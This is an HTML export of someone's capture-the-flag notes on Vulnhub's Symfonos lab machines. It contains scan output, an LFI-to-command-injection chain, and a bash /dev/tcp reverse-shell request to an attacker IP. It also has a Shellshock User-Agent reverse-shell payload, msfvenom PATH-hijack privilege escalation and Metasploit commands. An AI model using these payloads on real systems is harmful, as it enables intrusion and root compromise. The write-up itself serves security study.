&lt;group&gt;&lt;active&gt;</p><p>|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</p><p>| Statistics:</p><p>|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</p><p>|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</p><p>|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00</p><p>| smb2-security-mode: </p><p>|   3.1.1: </p><p>|_    Message signing enabled but not required</p><p>| p2p-conficker: </p><p>|   Checking for Conficker.C or higher...</p><p>|   Check 1 (port 13186/tcp): CLEAN (Couldn&#39;t connect)</p><p>|   Check 2 (port 38223/tcp): CLEAN (Couldn&#39;t connect)</p><p>|   Check 3 (port 42132/udp): CLEAN (Failed to receive data)</p><p>|   Check 4 (port 24094/udp): CLEAN (Failed to receive data)</p><p>|_  0/4 checks are positive: Host is CLEAN or ports are blocked</p><p>| smb2-time: </p><p>|   date: 2022-09-08T12:14:16</p><p>|_  start_date: N/A</p><p>| smb-os-discovery: </p><p>|   OS: Windows 6.1 (Samba 4.5.16-Debian)</p><p>|   Computer name: symfonos</p><p>|   NetBIOS computer name: SYMFONOS\x00</p><p>|   Domain name: \x00</p><p>|   FQDN: symfonos</p><p>|_  System time: 2022-09-08T07:14:16-05:00</p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--Symfonos1--Notes_385.html"></a><h1 class='title level-5'>Notes</h1><br/><p><img src="images/385-1.png" alt="images/385-1.png" /></p><p></p><p>helious</p><p>zeus</p><p></p><p>mounted this, and went to the /h3l105 directory</p><p><img src="images/385-2.png" alt="images/385-2.png" /></p><p></p><p></p><p>There I saw wordpress so I ran this:</p><p>wpscan --url <a href="http://symfonos.local/h3l105">http://symfonos.local/h3l105</a> -e vt,tt,u,ap | tee wpscan.log</p><p></p><p>I found mail pasta and looked it up</p><p><img src="images/385-3.png" alt="images/385-3.png" /></p><p></p><p>be careful and done add the “-” as it will not show up in searchsploit then</p><p><img src="images/385-4.png" alt="images/385-4.png" /></p><p></p><p></p><p></p><p>searchsploit -x php/webapps/40290.txt</p><p></p><p>it seems theres an LFI there and indeed it is</p><p><img src="images/385-5.png" alt="images/385-5.png" /></p><p></p><p></p><p>however i cannot get shell with RFI alone, so i upload a cmd paramater where the fail is stoered if I can reach it with LFI. at least that&#39;s the idea. </p><p><img src="images/385-6.png" alt="images/385-6.png" /></p><p></p><p></p><p></p><p>and indeed it works</p><p><img src="images/385-7.png" alt="images/385-7.png" /></p><p></p><p><a href="http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/../../../../../../var/mail/helios&cmd=ping%20-c%204%20192.168.1.42;id">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/../../../../../../var/mail/helios&amp;cmd=ping%20-c%204%20192.168.1.42;id</a></p><p></p><p>I am getting ping requsts so I have command injection now, and the SMTP + LFI trick worked great</p><p><img src="images/385-8.png" alt="images/385-8.png" /></p><p></p><p></p><p></p><p></p><p>GET /h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=bash+-c+&#39;exec+bash+-i+%26&gt;/dev/tcp/192.168.1.42/443+&lt;%261&#39; HTTP/1.1</p><p>Host: symfonos.local</p><p>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</p><p>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</p><p>Accept-Language: en-US,en;q=0.5</p><p>Accept-Encoding: gzip, deflate</p><p>Connection: close</p><p>Cookie: wordpress_test_cookie=WP+Cookie+check; PHPSESSID=5cs63ujourht5julja22c0des3</p><p>Upgrade-Insecure-Requests: 1</p><p></p><p></p><p></p><p>and we get a shell!</p><p><img src="images/385-9.png" alt="images/385-9.png" /></p><p></p><p></p><p>find / -type f -perm -04000 -ls 2&gt;/dev/null</p><p></p><p>we checked for suid binaries and saw cirl with some suspecious binaries it called without the full path, such as curl</p><p></p><p></p><p>strings /opt/statuscheck</p><p></p><p>our reverse shell we uploaded to /tmp</p><p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.42 LPORT=443 -f elf &gt; curl</p><p></p><p>next, lets change path environment variable and make the new curl binary executable</p><p></p><p>export PATH=/tmp:$PATH</p><p>chmod +x curl</p><p></p><p></p><p>next trigger the suid binary and enjoy ur new shell as root! :)</p><p>/opt/statuscheck</p><p></p><p><img src="images/385-10.png" alt="images/385-10.png" /></p><p></p><p><img src="images/385-11.png" alt="images/385-11.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--Symfonos1--HTTP_383.html"></a><h1 class='title level-5'>HTTP</h1><br/><p><img src="images/383-1.png" alt="images/383-1.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--Symfonos1--enum4linux-ng_384.html"></a><h1 class='title level-5'>enum4linux-ng</h1><br/><p>enum4linux-ng -A 192.168.1.41</p><p></p><p>USER FOUND</p><p><img src="images/384-1.png" alt="images/384-1.png" /></p><p></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--Symfonos2_388.html"></a><h1 class='title level-4'>Symfonos2</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--Symfonos2--nmap_392.html"></a><h1 class='title level-5'>nmap</h1><br/><p>PORT    STATE SERVICE     REASON         VERSION</p><p>21/tcp  open  ftp         syn-ack ttl 64 ProFTPD 1.3.5</p><p>22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</p><p>| ssh-hostkey: </p><p>|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)</p><p>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Cvyjh+QnQHsoZt3FqnW8JazNn1CYvc7uuArLkDPM25xV8l4Jc7Xw9InhmSFKJJD0mXhLALt/9byLeH7CyBEjpKATbSsEIL1iQ7G7ETmuOdZPfZxRnLhmaf1cvUxLapJQ5B3z67VR0PxvjfDk/0ARPAhKu1CuPmZk/y4t2iu8RKHG86j5jzR0KO3o2Aqsb2j+7XOd4IDCSFuoFiP3Eic/Jydtv73pyo+2JxBUvTSLaEtqe1op8sLP8wBFRX4Tvmqz/6zO1/zivBjBph8XMlzuMkMC8la8/XJmPb8U5C/8zfogG+YwycTw6ul7616PIj2ogPP89uyrTX9dM3RuZ9/1</p><p>|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)</p><p>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXypIGuum1SlMddq/BrUwIZM1sRIgbzdijCa1zYunAAT+uKTwPGaKO7e9RxYu97+ygLgpuRMthojpUlOgOVGOA=</p><p>|   256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)</p><p>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILluhq57UWA4q/mo/h6CjqWMpMOYB9VjtvBrHc6JsEGk</p><p>80/tcp  open  http        syn-ack ttl 64 WebFS httpd 1.21</p><p>|_http-server-header: webfs/1.21</p><p>|_http-title: Site doesn&#39;t have a title (text/html).</p><p>| http-methods: </p><p>|_  Supported Methods: GET HEAD</p><p>139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p><p>445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)</p><p>MAC Address: 08:00:27:F0:BA:BA (Oracle VirtualBox virtual NIC)</p><p>Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</p><p></p><p>Host script results:</p><p>|_clock-skew: mean: 1h40m57s, deviation: 2h53m12s, median: 56s</p><p>| smb-security-mode: </p><p>|   account_used: guest</p><p>|   authentication_level: user</p><p>|   challenge_response: supported</p><p>|_  message_signing: disabled (dangerous, but default)</p><p>| smb2-security-mode: </p><p>|   3.1.1: </p><p>|_    Message signing enabled but not required</p><p>| p2p-conficker: </p><p>|   Checking for Conficker.C or higher...</p><p>|   Check 1 (port 28775/tcp): CLEAN (Couldn&#39;t connect)</p><p>|   Check 2 (port 14795/tcp): CLEAN (Couldn&#39;t connect)</p><p>|   Check 3 (port 18866/udp): CLEAN (Failed to receive data)</p><p>|   Check 4 (port 37956/udp): CLEAN (Failed to receive data)</p><p>|_  0/4 checks are positive: Host is CLEAN or ports are blocked</p><p>| nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</p><p>| Names:</p><p>|   SYMFONOS2&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;</p><p>|   SYMFONOS2&lt;03&gt;        Flags: &lt;unique&gt;&lt;active&gt;</p><p>|   SYMFONOS2&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;</p><p>|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;</p><p>|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</p><p>|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;</p><p>|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</p><p>| Statistics:</p><p>|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</p><p>|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</p><p>|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00</p><p>| smb2-time: </p><p>|   date: 2022-09-10T07:46:59</p><p>|_  start_date: N/A</p><p>| smb-os-discovery: </p><p>|   OS: Windows 6.1 (Samba 4.5.16-Debian)</p><p>|   Computer name: symfonos2</p><p>|   NetBIOS computer name: SYMFONOS2\x00</p><p>|   Domain name: \x00</p><p>|   FQDN: symfonos2</p><p>|_  System time: 2022-09-10T02:46:59-05:00</p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--Symfonos2--notes_394.html"></a><h1 class='title level-5'>notes</h1><br/><p>S-1-22-1-1000 Unix User\aeolus (Local User)                                                                                                    </p><p>S-1-22-1-1001 Unix User\cronus (Local User)</p><p></p><p><img src="images/394-1.png" alt="images/394-1.png" /></p><p>sergioteamo</p><p></p><p>Password reuse!</p><p><img src="images/394-2.png" alt="images/394-2.png" /></p><p></p><p>aeolus@symfonos2:~$ find / -type f -perm -04000 -ls 2&gt;/dev/null</p><p>   922054     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device</p><p>   923944     44 -rwsr-xr--   1 root     messagebus    42992 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</p><p>  1053558    432 -rwsr-xr-x   1 root     root         440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign</p><p>   796686    996 -rwsr-xr-x   1 root     root        1019656 May 28  2019 /usr/sbin/exim4</p><p>   805767    140 -rwsr-xr-x   1 root     root         140944 Jun  5  2017 /usr/bin/sudo</p><p>   786513     60 -rwsr-xr-x   1 root     root          59680 May 17  2017 /usr/bin/passwd</p><p>   786510     40 -rwsr-xr-x   1 root     root          40504 May 17  2017 /usr/bin/chsh</p><p>   786509     52 -rwsr-xr-x   1 root     root          50040 May 17  2017 /usr/bin/chfn</p><p>   789374     40 -rwsr-xr-x   1 root     root          40312 May 17  2017 /usr/bin/newgrp</p><p>   786512     76 -rwsr-xr-x   1 root     root          75792 May 17  2017 /usr/bin/gpasswd</p><p>  1048620     44 -rwsr-xr-x   1 root     root          44304 Mar  7  2018 /bin/mount</p><p>  1048618     40 -rwsr-xr-x   1 root     root          40536 May 17  2017 /bin/su</p><p>  1048643     60 -rwsr-xr-x   1 root     root          61240 Nov 10  2016 /bin/ping</p><p>  1048621     32 -rwsr-xr-x   1 root     root          31720 Mar  7  2018 /bin/umount</p><p></p><p><a href="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c">https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c</a></p><p></p><p><img src="images/394-3.png" alt="images/394-3.png" /></p><p></p><p><img src="images/394-4.png" alt="images/394-4.png" /></p><p></p><p></p><p></p><p></p><p>use exploit/multi/handler</p><p>set lhost eth0</p><p>set lport 443</p><p>run</p><p></p><p>ctrl + z</p><p>search shell_to</p><p>use 0</p><p>sessions</p><p>set session 5</p><p>run</p><p>sessions 6</p><p></p><p></p><p>portfwd add -l 1234 -p 8080 -r 127.0.0.1</p><p>search librenms</p><p>use 1</p><p></p><p><img src="images/394-5.png" alt="images/394-5.png" /></p><p></p><p><img src="images/394-6.png" alt="images/394-6.png" /></p><p></p><p><img src="images/394-7.png" alt="images/394-7.png" /></p><p></p><p><img src="images/394-8.png" alt="images/394-8.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--Symfonos2--enum4linux_393.html"></a><h1 class='title level-5'>enum4linux</h1><br/><p>└─# enum4linux -a 192.168.1.46 | tee enum4linux.log                                                                                      130 ⨯</p><p>Starting enum4linux v0.9.1 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Sat Sep 10 04:39:37 2022</p><p></p><p> =========================================( Target Information )=========================================</p><p>                                                                                                                                               </p><p>Target ........... 192.168.1.46                                                                                                                </p><p>RID Range ........ 500-550,1000-1050</p><p>Username ......... &#39;&#39;</p><p>Password ......... &#39;&#39;</p><p>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p><p></p><p></p><p> ============================( Enumerating Workgroup/Domain on 192.168.1.46 )============================</p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>[+] Got domain/workgroup name: WORKGROUP                                                                                                       </p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p> ================================( Nbtstat Information for 192.168.1.46 )================================</p><p>                                                                                                                                               </p><p>Looking up status of 192.168.1.46                                                                                                              </p><p>        SYMFONOS2       &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</p><p>        SYMFONOS2       &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</p><p>        SYMFONOS2       &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</p><p>        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</p><p>        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</p><p>        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</p><p>        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</p><p></p><p>        MAC Address = 00-00-00-00-00-00</p><p></p><p> ===================================( Session Check on 192.168.1.46 )===================================</p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>[+] Server 192.168.1.46 allows sessions using username &#39;&#39;, password &#39;&#39;                                                                         </p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p> ================================( Getting domain SID for 192.168.1.46 )================================</p><p>                                                                                                                                               </p><p>Domain Name: WORKGROUP                                                                                                                         </p><p>Domain Sid: (NULL SID)</p><p></p><p>[+] Can&#39;t determine if host is part of domain or part of a workgroup                                                                           </p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p> ===================================( OS information on 192.168.1.46 )===================================</p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>[E] Can&#39;t get OS info with smbclient                                                                                                           </p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>[+] Got OS info for 192.168.1.46 from srvinfo:                                                                                                 </p><p>        SYMFONOS2      Wk Sv PrQ Unx NT SNT Samba 4.5.16-Debian                                                                                </p><p>        platform_id     :       500</p><p>        os version      :       6.1</p><p>        server type     :       0x809a03</p><p></p><p></p><p> =======================================( Users on 192.168.1.46 )=======================================</p><p>                                                                                                                                               </p><p>Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                        </p><p>Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.</p><p></p><p>Use of uninitialized value $users in print at ./enum4linux.pl line 986.</p><p>Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.</p><p></p><p> =================================( Share Enumeration on 192.168.1.46 )=================================</p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>        Sharename       Type      Comment</p><p>        ---------       ----      -------</p><p>        print$          Disk      Printer Drivers</p><p>        anonymous       Disk      </p><p>        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)</p><p>Reconnecting with SMB1 for workgroup listing.</p><p></p><p>        Server               Comment</p><p>        ---------            -------</p><p></p><p>        Workgroup            Master</p><p>        ---------            -------</p><p>        WORKGROUP            SYMFONOS2</p><p></p><p>[+] Attempting to map shares on 192.168.1.46                                                                                                   </p><p>                                                                                                                                               </p><p>//192.168.1.46/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                                              </p><p>//192.168.1.46/anonymous        Mapping: OK Listing: OK Writing: N/A</p><p></p><p>[E] Can&#39;t understand response:                                                                                                                 </p><p>                                                                                                                                               </p><p>NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                     </p><p>//192.168.1.46/IPC$     Mapping: N/A Listing: N/A Writing: N/A</p><p></p><p> ============================( Password Policy Information for 192.168.1.46 )============================</p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p></p><p>[+] Attaching to 192.168.1.46 using a NULL share</p><p></p><p>[+] Trying protocol 139/SMB...</p><p></p><p>[+] Found domain(s):</p><p></p><p>        [+] SYMFONOS2</p><p>        [+] Builtin</p><p></p><p>[+] Password Info for Domain: SYMFONOS2</p><p></p><p>        [+] Minimum password length: 5</p><p>        [+] Password history length: None</p><p>        [+] Maximum password age: 37 days 6 hours 21 minutes </p><p>        [+] Password Complexity Flags: 000000</p><p></p><p>                [+] Domain Refuse Password Change: 0</p><p>                [+] Domain Password Store Cleartext: 0</p><p>                [+] Domain Password Lockout Admins: 0</p><p>                [+] Domain Password No Clear Change: 0</p><p>                [+] Domain Password No Anon Change: 0</p><p>                [+] Domain Password Complex: 0</p><p></p><p>        [+] Minimum password age: None</p><p>        [+] Reset Account Lockout Counter: 30 minutes </p><p>        [+] Locked Account Duration: 30 minutes </p><p>        [+] Account Lockout Threshold: None</p><p>        [+] Forced Log off Time: 37 days 6 hours 21 minutes </p><p></p><p></p><p></p><p>[+] Retieved partial password policy with rpcclient:                                                                                           </p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>Password Complexity: Disabled                                                                                                                  </p><p>Minimum Password Length: 5</p><p></p><p></p><p> =======================================( Groups on 192.168.1.46 )=======================================</p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>[+] Getting builtin groups:                                                                                                                    </p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>[+]  Getting builtin group memberships:                                                                                                        </p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>[+]  Getting local groups:                                                                                                                     </p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>[+]  Getting local group memberships:                                                                                                          </p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>[+]  Getting domain groups:                                                                                                                    </p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>[+]  Getting domain group memberships:                                                                                                         </p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p> ==================( Users on 192.168.1.46 via RID cycling (RIDS: 500-550,1000-1050) )==================</p><p>                                                                                                                                               </p><p>                                                                                                                                               </p><p>[I] Found new SID:                                                                                                                             </p><p>S-1-22-1                                                                                                                                       </p><p></p><p>[I] Found new SID:                                                                                                                             </p><p>S-1-5-32                                                                                                                                       </p><p></p><p>[I] Found new SID:                                                                                                                             </p><p>S-1-5-32                                                                                                                                       </p><p></p><p>[I] Found new SID:                                                                                                                             </p><p>S-1-5-32                                                                                                                                       </p><p></p><p>[I] Found new SID:                                                                                                                             </p><p>S-1-5-32                                                                                                                                       </p><p></p><p>[+] Enumerating users using SID S-1-5-21-629329663-2933547119-2337616968 and logon username &#39;&#39;, password &#39;&#39;                                    </p><p>                                                                                                                                               </p><p>S-1-5-21-629329663-2933547119-2337616968-501 SYMFONOS2\nobody (Local User)                                                                     </p><p>S-1-5-21-629329663-2933547119-2337616968-513 SYMFONOS2\None (Domain Group)</p><p></p><p>[+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39;                                                                    </p><p>                                                                                                                                               </p><p>S-1-22-1-1000 Unix User\aeolus (Local User)                                                                                                    </p><p>S-1-22-1-1001 Unix User\cronus (Local User)</p><p></p><p>[+] Enumerating users using SID S-1-5-32 and logon username &#39;&#39;, password &#39;&#39;                                                                    </p><p>                                                                                                                                               </p><p>S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                              </p><p>S-1-5-32-545 BUILTIN\Users (Local Group)</p><p>S-1-5-32-546 BUILTIN\Guests (Local Group)</p><p>S-1-5-32-547 BUILTIN\Power Users (Local Group)</p><p>S-1-5-32-548 BUILTIN\Account Operators (Local Group)</p><p>S-1-5-32-549 BUILTIN\Server Operators (Local Group)</p><p>S-1-5-32-550 BUILTIN\Print Operators (Local Group)</p><p></p><p> ===============================( Getting printer info for 192.168.1.46 )===============================</p><p>                                                                                                                                               </p><p>No printers returned.                                                                                                                          </p><p></p><p></p><p>enum4linux complete on Sat Sep 10 04:39:46 2022</p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--symfonos3_403.html"></a><h1 class='title level-4'>symfonos3</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--symfonos3--nmap_404.html"></a><h1 class='title level-5'>nmap</h1><br/><p>PORT   STATE SERVICE REASON         VERSION</p><p>21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.5b</p><p>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</p><p>| ssh-hostkey: </p><p>|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)</p><p>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDK0oaDrdLT7VSjY1FV9llkwWSCIm/t8s6PnjgkyBm01dLPZwMPupDHRDs0hTAPu8ULa5FmXEc9JnHYQQQ07ZACw1RmDEyWWtkOY90lVHfFEIv6LCviLpzw/qW9o6RCmu/cV24FvMzU7tjWedOu21ZXGQgMSq2HfQWV2Hr5+mRbUFeh6HIBYd7v2tbATO+dPii3cF52KgD9/KgSZX2Mj4ZK/JW8E7c3kZPhtqAfrg7nPuhl0T02uk1mD6PIRqNag1SHYWRhvfIb3rP2vbSNAxpzwPp31u5+Iee7c3NBxpqOFFw143TzwMO+CRwdaJWI9dbsLoNvJYn96YjmPO0Y86Bl</p><p>|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)</p><p>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEogzxRYvlNzB6cgNCHP6IB3h5LWSrGWbI1c46IQ2JiPR2Bfo04xA+nGxuGekG3WmjkK2dC5u+xsCR6ihBXDpjU=</p><p>|   256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)</p><p>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHZVA1Masiw/GOsw3RTrujE9a9BtwyxHF9w53yqKs5RG</p><p>80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))</p><p>| http-methods: </p><p>|_  Supported Methods: GET HEAD POST OPTIONS</p><p>|_http-title: Site doesn&#39;t have a title (text/html).</p><p>|_http-server-header: Apache/2.4.25 (Debian)</p><p>MAC Address: 08:00:27:D7:5F:4B (Oracle VirtualBox virtual NIC)</p><p>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--symfonos3--notes_405.html"></a><h1 class='title level-5'>notes</h1><br/><p>000005172:   403        9 L      28 W       277 Ch      &quot;wp-forum.phps&quot;                                                                  </p><p></p><p></p><p><a href="http://192.168.1.48/gate/cerberus/tartarus/research">http://192.168.1.48/gate/cerberus/tartarus/research</a></p><p></p><p>cgi-bin dir gave 403, but found underworld with 200 response behind it</p><p><a href="http://symfonos3.local/cgi-bin/underworld">http://symfonos3.local/cgi-bin/underworld</a></p><p></p><p></p><p></p><p><a href="https://www.exploit-db.com/docs/48112">https://www.exploit-db.com/docs/48112</a></p><p>(nc version did not work, but bash did)</p><p></p><p></p><p>User-Agent: () { :;}; /bin/bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.1.42/443 &lt;&amp;1&#39;</p><p></p><p><img src="images/405-1.png" alt="images/405-1.png" /></p><p></p><p>====</p><p>PRIVESC</p><p></p><p>suid</p><p></p><p><img src="images/405-2.png" alt="images/405-2.png" /></p><p></p><p><img src="images/405-3.png" alt="images/405-3.png" /></p><p></p><p>check for cap later</p><p></p><p></p><p>╔══════════╣ Analyzing Htpasswd Files (limit 70)</p><p>-rw-r--r-- 1 root root 47 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd         </p><p>username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/</p><p>-rw-r--r-- 1 root root 47 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd</p><p>username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.</p><p>-rw-r--r-- 1 root root 62 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd</p><p>username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04</p><p>-rw-r--r-- 1 root root 117 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd</p><p>username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8</p><p>05bbb04</p><p>anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a</p><p>-rw-r--r-- 1 root root 62 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd</p><p>username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04</p><p>-rw-r--r-- 1 root root 62 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd</p><p>username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30</p><p>4105bbb04</p><p></p><p></p><p>locate phpsessionclean.timer</p><p></p><p><img src="images/405-4.png" alt="images/405-4.png" /></p><p></p><p></p><p>tcpdump -i lo</p><p>(tcpdmp didnt work cuz of some mistake, mby with my virtualbox conf, unsure)</p><p></p><p>would find creds due to ftp being an unencrypted protocol</p><p></p><p><h3>hades:PTpZTfU4vxgzvRBE</h3></p><p></p><p>ssh hades@192.168.1.48</p><p><img src="images/405-5.png" alt="images/405-5.png" /></p><p></p><p><img src="images/405-6.png" alt="images/405-6.png" /></p><p></p><p>So now we see if can perform library hijacking. </p><p></p><p></p><p>So we cannot write or execute this file, but we are apparently allowed to move it. Should be innocent enough, right? Right? ;))))</p><p><img src="images/405-7.png" alt="images/405-7.png" /></p><p></p><p>Edit new file:</p><p><img src="images/405-8.png" alt="images/405-8.png" /></p><p></p><p>Now, since we know root is running python 2.7 and executing the ftpclient.py script, which again, contains ftplib as a library, we can hijack that library path given our group permissions. </p><p></p><p><img src="images/405-9.png" alt="images/405-9.png" /></p><p></p><p>And we are root, yummy ;)</p><p></p><p></p><p></p><p></p><p><img src="images/405-10.png" alt="images/405-10.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--sick_os_399.html"></a><h1 class='title level-4'>sick os</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--sick_os--nmap_400.html"></a><h1 class='title level-5'>nmap</h1><br/><p>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</p><p>| ssh-hostkey: </p><p>|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)</p><p>| ssh-dss AAAAB3NzaC1kc3MAAACBAOIxfyihj8eGscDruPXEPCuyC6uhrQpv12KkA+pHxY0vIhniTjuWkhcLyUYVgbEJ62vZp7pc1K18sdTj680hZfYdxjljdo0RjtR9HS8QRMaaqwbDqDspWQt2Nm14oC3I85bW01GZUolXcixMpwzzm0MDznX7fY8W6D9B5YdQ4Pc3AAAAFQCCt8GUWe+/dbKoaAjHzlVEcFgUhQAAAIAFmq533sTKwbTcmyR4lst2maXrP+RWzyHjbTlRkBlEBeEw/R53tj5VW1qNhCnw/zTMYcZZhrQLyMKr7Y5ePKEKivgERmVqBRtSZbimrX/Vu5FnrIHSivq1jQ1cdy+OdroAYzOuH3ctIWpSGqbYhsAXAJsXc5f42DciYUaSG7f07gAAAIAOcLVsR8gSH4jPF57g44KGHq9AWj4VWaD0z7gLvJFhmFeEu233kZ1L6LKkkSS2EHRlAaiH8MmPbVqT2Qd1MVldmzalhqWverwtLJvWhRGL/wLf/DNYASywt7nEBSmKQGnqUt6Cr98FAgoGljcUQ4plwJBEpLRL0T10ljWqi9vYBQ==</p><p>|   